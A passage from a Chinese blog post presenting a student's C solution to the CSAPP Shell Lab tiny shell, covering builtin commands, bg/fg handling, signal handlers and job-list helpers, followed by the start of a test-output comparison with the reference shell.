'</span>;  <span class="comment">/* replace trailing '\n' with space */</span></span><br><span class="line">    <span class="keyword">while</span> (*buf &amp;&amp; (*buf == <span class="string">' '</span>)) <span class="comment">/* ignore leading spaces */</span></span><br><span class="line">buf++;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Build the argv list */</span></span><br><span class="line">    argc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (*buf == <span class="string">'\''</span>) &#123;</span><br><span class="line">buf++;</span><br><span class="line">delim = <span class="built_in">strchr</span>(buf, <span class="string">'\''</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">delim = <span class="built_in">strchr</span>(buf, <span class="string">' '</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (delim) &#123;</span><br><span class="line">argv[argc++] = buf;</span><br><span class="line">*delim = <span class="string">'\0'</span>;</span><br><span class="line">buf = delim + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (*buf &amp;&amp; (*buf == <span class="string">' '</span>)) <span class="comment">/* ignore spaces */</span></span><br><span class="line">       buf++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (*buf == <span class="string">'\''</span>) &#123;</span><br><span class="line">    buf++;</span><br><span class="line">    delim = <span class="built_in">strchr</span>(buf, <span class="string">'\''</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    delim = <span class="built_in">strchr</span>(buf, <span class="string">' '</span>);</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    argv[argc] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">0</span>)  <span class="comment">/* ignore blank line */</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* should the job run in the background? */</span></span><br><span class="line">    <span class="keyword">if</span> ((bg = (*argv[argc<span class="number">-1</span>] == <span class="string">'&amp;'</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">argv[--argc] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bg;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * builtin_cmd - If the user has typed a built-in command then execute</span></span><br><span class="line"><span class="comment"> *    it immediately.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">"quit"</span>))   <span class="comment">//退出命令</span></span><br><span class="line">    &#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; MAXJOBS;i ++)&#123;</span><br><span class="line"><span class="keyword">if</span>(jobs[i].pid != <span class="number">0</span>)&#123;</span><br><span class="line">kill(jobs[i].pid, SIGKILL);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">"jobs"</span>))    <span class="comment">//job order</span></span><br><span class="line">    &#123;</span><br><span class="line">        listjobs(jobs);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">"bg"</span>) || !<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">"fg"</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        do_bgfg(argv);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * do_bgfg - Execute the builtin bg and fg commands</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* $begin handout */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">jobp</span>=<span class="title">NULL</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Ignore command if no argument */</span></span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">1</span>] == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s command requires PID or %%jobid argument\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Parse the required PID or %JID arg */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isdigit</span>(argv[<span class="number">1</span>][<span class="number">0</span>])) &#123;</span><br><span class="line"><span class="keyword">pid_t</span> pid = atoi(argv[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">if</span> (!(jobp = getjobpid(jobs, pid))) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"(%d): No such process\n"</span>, pid);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (argv[<span class="number">1</span>][<span class="number">0</span>] == <span class="string">'%'</span>) &#123;</span><br><span class="line"><span class="keyword">int</span> jid = atoi(&amp;argv[<span class="number">1</span>][<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">if</span> (!(jobp = getjobjid(jobs, jid))) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s: No such job\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s: argument must be a PID or %%jobid\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* bg command */</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"bg"</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (kill(-(jobp-&gt;pid), SIGCONT) &lt; <span class="number">0</span>)</span><br><span class="line">    unix_error(<span class="string">"kill (bg) error"</span>);</span><br><span class="line">jobp-&gt;state = BG;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[%d] (%d) %s"</span>, jobp-&gt;jid, jobp-&gt;pid, jobp-&gt;cmdline);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* fg command */</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"fg"</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (kill(-(jobp-&gt;pid), SIGCONT) &lt; <span class="number">0</span>)</span><br><span class="line">    unix_error(<span class="string">"kill (fg) error"</span>);</span><br><span class="line">jobp-&gt;state = FG;</span><br><span class="line">waitfg(jobp-&gt;pid);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"do_bgfg: Internal error\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* $end handout */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * waitfg - Block until process pid is no longer the foreground process</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitfg</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">sigset_t</span> mask;</span><br><span class="line">sigemptyset(&amp;mask);</span><br><span class="line"><span class="keyword">while</span>(pid == fgpid(jobs))&#123;</span><br><span class="line">sigsuspend(&amp;mask);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*****************</span></span><br><span class="line"><span class="comment"> * Signal handlers</span></span><br><span class="line"><span class="comment"> *****************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sigchld_handler - The kernel sends a SIGCHLD to the shell whenever</span></span><br><span class="line"><span class="comment"> *     a child job terminates (becomes a zombie), or stops because it</span></span><br><span class="line"><span class="comment"> *     received a SIGSTOP or SIGTSTP signal. The handler reaps all</span></span><br><span class="line"><span class="comment"> *     available zombie children, but doesn't wait for any other</span></span><br><span class="line"><span class="comment"> *     currently running children to terminate.</span></span><br><span class="line"><span class="comment"> 当一个进程称为僵死进程的时候，内核发送一个SIGCHLD信号给shell，</span></span><br><span class="line"><span class="comment"> 或者是由于收到了SIGINT或者SIGTSTP信号而终止。</span></span><br><span class="line"><span class="comment"> 处理函数回收所有可见的僵死进程，但是不会等待当前正在进行的进程的子进程终止才执行回收。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> olderrno = errno;<span class="comment">//记录原来状态</span></span><br><span class="line"><span class="keyword">pid_t</span> pid;<span class="comment">//当前pid</span></span><br><span class="line"><span class="keyword">int</span> status;<span class="comment">//waitpid的status参数</span></span><br><span class="line"><span class="keyword">sigset_t</span> mask, prev;<span class="comment">//存储状态</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">tmpjob</span>;</span></span><br><span class="line">sigfillset(&amp;mask);<span class="comment">//首先先初始化</span></span><br><span class="line"><span class="keyword">while</span>((pid = waitpid(<span class="number">-1</span>, &amp;status, WNOHANG|WUNTRACED)) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev);</span><br><span class="line">        tmpjob = getjobpid(jobs, pid);</span><br><span class="line">        <span class="keyword">if</span>(WIFSTOPPED(status))&#123;</span><br><span class="line">            tmpjob-&gt;state = ST;<span class="comment">//如果是停止的信号，那么执行以下的操作</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) stopped by signal %d\n"</span>, tmpjob-&gt;jid, tmpjob-&gt;pid, WSTOPSIG(status));</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(WIFSIGNALED(status))&#123;<span class="comment">//如果是未捕获，执行以下操作</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) terminated by signal %d\n"</span>, tmpjob-&gt;jid, tmpjob-&gt;pid, WTERMSIG(status));</span><br><span class="line">            &#125;</span><br><span class="line">            deletejob(jobs, pid);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    errno = olderrno;<span class="comment">//恢复状态</span></span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sigint_handler - The kernel sends a SIGINT to the shell whenver the</span></span><br><span class="line"><span class="comment"> *    user types ctrl-c at the keyboard.  Catch it and send it along</span></span><br><span class="line"><span class="comment"> *    to the foreground job.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> olderrno = errno;</span><br><span class="line"><span class="keyword">sigset_t</span> mask, prev;</span><br><span class="line"><span class="keyword">pid_t</span> fg_pid;</span><br><span class="line"></span><br><span class="line">sigfillset(&amp;mask);</span><br><span class="line">sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev);</span><br><span class="line">fg_pid = fgpid(jobs);</span><br><span class="line">sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span>(fg_pid != <span class="number">0</span>)&#123;</span><br><span class="line">kill(<span class="number">0</span> - fg_pid, SIGINT);</span><br><span class="line">&#125;</span><br><span class="line">errno = olderrno;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever</span></span><br><span class="line"><span class="comment"> *     the user types ctrl-z at the keyboard. Catch it and suspend the</span></span><br><span class="line"><span class="comment"> *     foreground job by sending it a SIGTSTP.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> olderrno = errno;</span><br><span class="line"><span class="keyword">sigset_t</span> mask, prev;</span><br><span class="line"><span class="keyword">pid_t</span> fg_pid;</span><br><span class="line"></span><br><span class="line">sigfillset(&amp;mask);</span><br><span class="line">sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev);</span><br><span class="line">fg_pid = fgpid(jobs);</span><br><span class="line">sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span>(fg_pid != <span class="number">0</span>)&#123;</span><br><span class="line">kill(<span class="number">0</span> - fg_pid, SIGTSTP);</span><br><span class="line">&#125;</span><br><span class="line">errno = olderrno;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*********************</span></span><br><span class="line"><span class="comment"> * End signal handlers</span></span><br><span class="line"><span class="comment"> *********************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/***********************************************</span></span><br><span class="line"><span class="comment"> * Helper routines that manipulate the job list</span></span><br><span class="line"><span class="comment"> **********************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* clearjob - Clear the entries in a job struct */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clearjob</span><span class="params">(struct <span class="keyword">job_t</span> *job)</span> </span>&#123;</span><br><span class="line">    job-&gt;pid = <span class="number">0</span>;</span><br><span class="line">    job-&gt;jid = <span class="number">0</span>;</span><br><span class="line">    job-&gt;state = UNDEF;</span><br><span class="line">    job-&gt;cmdline[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* initjobs - Initialize the job list */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initjobs</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">clearjob(&amp;jobs[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* maxjid - Returns largest allocated job ID */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxjid</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, max=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line"><span class="keyword">if</span> (jobs[i].jid &gt; max)</span><br><span class="line">    max = jobs[i].jid;</span><br><span class="line">    <span class="keyword">return</span> max;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* addjob - Add a job to the job list */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addjob</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">pid_t</span> pid, <span class="keyword">int</span> state, <span class="keyword">char</span> *cmdline)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (jobs[i].pid == <span class="number">0</span>) &#123;</span><br><span class="line">    jobs[i].pid = pid;</span><br><span class="line">    jobs[i].state = state;</span><br><span class="line">    jobs[i].jid = nextjid++;</span><br><span class="line">    <span class="keyword">if</span> (nextjid &gt; MAXJOBS)</span><br><span class="line">nextjid = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(jobs[i].cmdline, cmdline);</span><br><span class="line">      <span class="keyword">if</span>(verbose)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Added job [%d] %d %s\n"</span>, jobs[i].jid, jobs[i].pid, jobs[i].cmdline);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Tried to create too many jobs\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* deletejob - Delete a job whose PID=pid from the job list */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">deletejob</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (jobs[i].pid == pid) &#123;</span><br><span class="line">    clearjob(&amp;jobs[i]);</span><br><span class="line">    nextjid = maxjid(jobs)+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* fgpid - Return PID of current foreground job, 0 if no such job */</span></span><br><span class="line"><span class="keyword">pid_t</span> fgpid(struct <span class="keyword">job_t</span> *jobs) &#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line"><span class="keyword">if</span> (jobs[i].state == FG)</span><br><span class="line">    <span class="keyword">return</span> jobs[i].pid;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* getjobpid  - Find a job (by PID) on the job list */</span></span><br><span class="line"><span class="function">struct job_t *<span class="title">getjobpid</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">pid_t</span> pid)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line"><span class="keyword">if</span> (jobs[i].pid == pid)</span><br><span class="line">    <span class="keyword">return</span> &amp;jobs[i];</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* getjobjid  - Find a job (by JID) on the job list */</span></span><br><span class="line"><span class="function">struct job_t *<span class="title">getjobjid</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">int</span> jid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (jid &lt; <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line"><span class="keyword">if</span> (jobs[i].jid == jid)</span><br><span class="line">    <span class="keyword">return</span> &amp;jobs[i];</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* pid2jid - Map process ID to job ID */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pid2jid</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line"><span class="keyword">if</span> (jobs[i].pid == pid) &#123;</span><br><span class="line">            <span class="keyword">return</span> jobs[i].jid;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* listjobs - Print the job list */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">listjobs</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (jobs[i].pid != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[%d] (%d) "</span>, jobs[i].jid, jobs[i].pid);</span><br><span class="line">    <span class="keyword">switch</span> (jobs[i].state) &#123;</span><br><span class="line"><span class="keyword">case</span> BG:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Running "</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> FG:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Foreground "</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> ST:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Stopped "</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"listjobs: Internal error: job[%d].state=%d "</span>,</span><br><span class="line">   i, jobs[i].state);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, jobs[i].cmdline);</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/******************************</span></span><br><span class="line"><span class="comment"> * end job list helper routines</span></span><br><span class="line"><span class="comment"> ******************************/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/***********************</span></span><br><span class="line"><span class="comment"> * Other helper routines</span></span><br><span class="line"><span class="comment"> ***********************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * usage - print a help message</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usage</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Usage: shell [-hvp]\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"   -h   print this message\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"   -v   print additional diagnostic information\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"   -p   do not emit a command prompt\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * unix_error - unix-style error routine</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unix_error</span><span class="params">(<span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">"%s: %s\n"</span>, msg, strerror(errno));</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app_error - application-style error routine</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">app_error</span><span class="params">(<span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">"%s\n"</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Signal - wrapper for the sigaction function</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">handler_t</span> *Signal(<span class="keyword">int</span> signum, <span class="keyword">handler_t</span> *handler)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">action</span>, <span class="title">old_action</span>;</span></span><br><span class="line"></span><br><span class="line">    action.sa_handler = handler;</span><br><span class="line">    sigemptyset(&amp;action.sa_mask); <span class="comment">/* block sigs of type being handled */</span></span><br><span class="line">    action.sa_flags = SA_RESTART; <span class="comment">/* restart syscalls if possible */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sigaction(signum, &amp;action, &amp;old_action) &lt; <span class="number">0</span>)</span><br><span class="line">unix_error(<span class="string">"Signal error"</span>);</span><br><span class="line">    <span class="keyword">return</span> (old_action.sa_handler);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sigquit_handler - The driver program can gracefully terminate the</span></span><br><span class="line"><span class="comment"> *    child shell by sending it a SIGQUIT signal.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigquit_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Terminating after receipt of SIGQUIT signal\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="TinyShell测试"><a href="#TinyShell测试" class="headerlink" title="TinyShell测试"></a>TinyShell测试</h1><p>测试用例1:</p><p>tsh的测试结果    <img src="/CSAPP-ShellLab-哈工大简化版/4.png" alt="4"></p><p>tshref的测试结果</p><p><img src="/CSAPP-ShellLab-哈工大简化版/5.png" alt="5"></p><p>测试用例2:</p><p>tsh的测试结果</p><p><img src="/CSAPP-ShellLab-哈工大简化版/6.png" alt="6"></p><p>tshref的测试结果<img src="/CSAPP-ShellLab-哈工大简化版/7.png" alt="7"></p><p>测试用例3:</p><p>tsh的测试结果<img src="/CSAPP-ShellLab-哈工大简化版/8.png" alt="8"></p><p>tshref的测试结果<img src="/CSAPP-ShellLab-哈工大简化版/9.png" alt="9"></p><p>测试用例4:</p><p>tsh的测试结果<img src="/CSAPP-ShellLab-哈工大简化版/11.png" alt="11"></p><p>tshref的测试结果<img src="/CSAPP-ShellLab-哈工大简化版/10.png" 